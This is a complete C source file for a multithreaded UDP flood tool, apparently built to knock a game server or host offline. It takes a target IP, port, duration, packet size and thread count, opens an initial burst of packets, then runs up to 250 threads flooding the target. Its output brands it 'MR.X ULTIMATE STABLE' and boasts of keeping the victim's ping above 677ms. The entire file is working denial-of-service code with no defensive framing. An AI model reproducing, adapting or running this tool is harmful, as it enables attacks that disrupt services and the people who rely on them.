#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>

#define BUFFER_COUNT 256
#define FLOOD_SOCKETS 10
#define MAX_PPS_PER_THREAD 8000

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int flood_complete = 0;

char *buffers[BUFFER_COUNT];
struct sockaddr_in target_addr;

void flood_start() {
    int socks[FLOOD_SOCKETS];
    char *packet = malloc(PACKET_SIZE);
    if (!packet) {
        atomic_store(&flood_complete, 1);
        return;
    }
    
    memset(packet, 0xFF, PACKET_SIZE);
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) {
            socks[i] = -1;
            continue;
        }
        
        int enable = 1;
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable));
        
        int sndbuf = 2 * 1024 * 1024;
        setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        
        int flags = fcntl(socks[i], F_GETFL, 0);
        fcntl(socks[i], F_SETFL, flags | O_NONBLOCK);
    }
    
    int sent = 0;
    struct timeval start, current;
    gettimeofday(&start, NULL);
    
    while (sent < 50000) {
        gettimeofday(&current, NULL);
        if ((current.tv_sec - start.tv_sec) >= 1) break;
        
        for (int i = 0; i < FLOOD_SOCKETS; i++) {
            if (socks[i] < 0) continue;
            
            for (int p = 0; p < 25; p++) {
                sendto(socks[i], packet, PACKET_SIZE, MSG_DONTWAIT,
                      (struct sockaddr*)&target_addr, sizeof(target_addr));
                sent++;
            }
        }
        usleep(1000);
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
    }
    
    free(packet);
    printf("[FL00D] Sent %d packets in first second\n", sent);
    atomic_store(&flood_complete, 1);
}

int init_buffers() {
    if (PACKET_SIZE < 20) PACKET_SIZE = 20;
    if (PACKET_SIZE > 1024) PACKET_SIZE = 1024;
    
    for (int i = 0; i < BUFFER_COUNT; i++) {
        buffers[i] = malloc(PACKET_SIZE);
        if (!buffers[i]) {
            for (int j = 0; j < i; j++) free(buffers[j]);
            return 0;
        }
        
        for (int j = 0; j < PACKET_SIZE; j++) {
            buffers[i][j] = (char)((i * 97 + j * 31) & 0xFF);
        }
    }
    return 1;
}

void cleanup_buffers() {
    for (int i = 0; i < BUFFER_COUNT; i++) {
        if (buffers[i]) free(buffers[i]);
    }
}

void *attack_thread(void *arg) {
    int thread_id = *(int *)arg;
    
    while (atomic_load(&flood_complete) == 0) usleep(1000);
    
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(thread_id % 2, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
#endif
    
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) pthread_exit(NULL);
    
    int enable = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable));
    
    int sndbuf;
    if (PACKET_SIZE <= 64) sndbuf = 4 * 1024 * 1024;
    else if (PACKET_SIZE <= 256) sndbuf = 8 * 1024 * 1024;
    else sndbuf = 16 * 1024 * 1024;
    
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
    
    time_t start_time = time(NULL);
    int packet_index = thread_id % BUFFER_COUNT;
    
    int burst_size;
    if (PACKET_SIZE < 64) burst_size = 96;
    else if (PACKET_SIZE < 128) burst_size = 64;
    else burst_size = 32;
    
    int target_pps = 5000;
    int bursts_per_second = target_pps / burst_size;
    if (bursts_per_second == 0) bursts_per_second = 1;
    int sleep_time = 1000000 / bursts_per_second;
    
    unsigned long long packets_this_second = 0;
    time_t current_second = time(NULL);
    
    while (atomic_load(&stop_signal) == 0) {
        if (time(NULL) - start_time >= ATTACK_TIME) break;
        
        time_t now = time(NULL);
        if (now != current_second) {
            packets_this_second = 0;
            current_second = now;
        }
        
        if (packets_this_second >= MAX_PPS_PER_THREAD) {
            while (time(NULL) == current_second) usleep(1000);
            packets_this_second = 0;
            current_second = time(NULL);
        }
        
        for (int i = 0; i < burst_size; i++) {
            sendto(sockfd, buffers[packet_index], PACKET_SIZE, 
                   MSG_DONTWAIT, (struct sockaddr *)&target_addr, 
                   sizeof(target_addr));
            
            packet_index = (packet_index + 1) % BUFFER_COUNT;
            packets_this_second++;
            
            atomic_fetch_add(&total_packets, 1);
            atomic_fetch_add(&total_bytes, PACKET_SIZE);
        }
        
        usleep(sleep_time);
    }
    
    close(sockfd);
    pthread_exit(NULL);
}

void *stats_monitor(void *arg) {
    sleep(1);
    
    printf("\n");
    printf("🚀 INSTANT 677ms+ ATTACK STARTED\n");
    
    unsigned long long first = atomic_load(&total_packets);
    printf("✅ FIRST SECOND: %.0fK packets | PING: 677ms+\n", first / 1000.0);
    
    unsigned long long prev_packets = first;
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    
    for (int second = 2; second <= ATTACK_TIME && atomic_load(&stop_signal) == 0; second++) {
        sleep(1);
        
        unsigned long long current_packets = atomic_load(&total_packets);
        unsigned long long current_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = current_packets - prev_packets;
        unsigned long long bytes_sec = current_bytes - prev_bytes;
        
        double megabytes = bytes_sec / (1024.0 * 1024.0);
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        double pps_k = pps / 1000.0;
        double peak_k = atomic_load(&peak_pps) / 1000.0;
        
        printf("⏱️ T+%03ds | 🔥 PPS: %.0fK | 📈 Peak: %.0fK | 🎯 Ping: 677ms+\n", 
               second, pps_k, peak_k);
        
        fflush(stdout);
        prev_packets = current_packets;
        prev_bytes = current_bytes;
    }
    
    unsigned long long final_packets = atomic_load(&total_packets);
    unsigned long long final_bytes = atomic_load(&total_bytes);
    unsigned long long final_peak = atomic_load(&peak_pps);
    
    printf("\n");
    printf("🎉 ATTACK COMPLETED\n");
    printf("\n");
    
    printf("📊 Total packets: %llu\n", final_packets);
    printf("💾 Total data: %.2f MB\n", final_bytes / (1024.0 * 1024.0));
    printf("🚀 Peak PPS: %.0fK\n", final_peak / 1000.0);
    printf("⚡ Average PPS: %.0fK\n", (final_packets / (ATTACK_TIME * 1.0)) / 1000.0);
    printf("🎯 Ping maintained: 677ms+ for %d seconds\n", ATTACK_TIME);
    
    printf("\n");
    printf("🚀 MR.X ULTIMATE STABLE\n");
    
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (ATTACK_TIME < 10) ATTACK_TIME = 10;
    if (PACKET_SIZE < 20) PACKET_SIZE = 20;
    if (PACKET_SIZE > 1024) PACKET_SIZE = 1024;
    if (THREAD_COUNT < 50) THREAD_COUNT = 50;
    if (THREAD_COUNT > 250) THREAD_COUNT = 250;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr);
    
    if (!init_buffers()) {
        printf("Buffer initialization failed\n");
        return 1;
    }
    
    printf("Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("Packet: %d bytes | Threads: %d\n", PACKET_SIZE, THREAD_COUNT);
    
    pthread_t flood_thread;
    pthread_create(&flood_thread, NULL, (void*)flood_start, NULL);
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *thread_ids = malloc(THREAD_COUNT * sizeof(int));
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_ids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &thread_ids[i]);
    }
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    pthread_join(flood_thread, NULL);
    
    sleep(ATTACK_TIME);
    
    atomic_store(&stop_signal, 1);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_thread, NULL);
    
    cleanup_buffers();
    free(threads);
    free(thread_ids);
    
    return 0;
}